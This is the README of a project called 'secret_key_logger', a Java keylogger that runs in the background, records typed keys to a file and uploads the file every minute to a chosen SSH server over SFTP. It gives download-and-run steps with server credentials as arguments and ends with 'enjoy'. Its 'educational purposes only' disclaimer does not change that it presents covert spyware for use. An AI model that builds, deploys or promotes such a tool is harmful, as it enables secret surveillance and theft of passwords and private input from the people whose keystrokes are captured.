# secret_key_logger
Java application that runs in the background to log typed keys to a server using SSH protocol. Attention this application is for educational purposes only

## description
This application for educational purposes only. it connects to the given ssh server and at the same time it listens to the keyboard input and stores the input to a file continuously. Every 1 min it uploads the file to the ssh server using sftp protocol 

## How to use
- Download the latest jar file from the release
- Run the jar file using `java -jar secret_key_logger.jar`
- give the following arguments `{username} {host} {password} {port} {file_name}`
- enjoy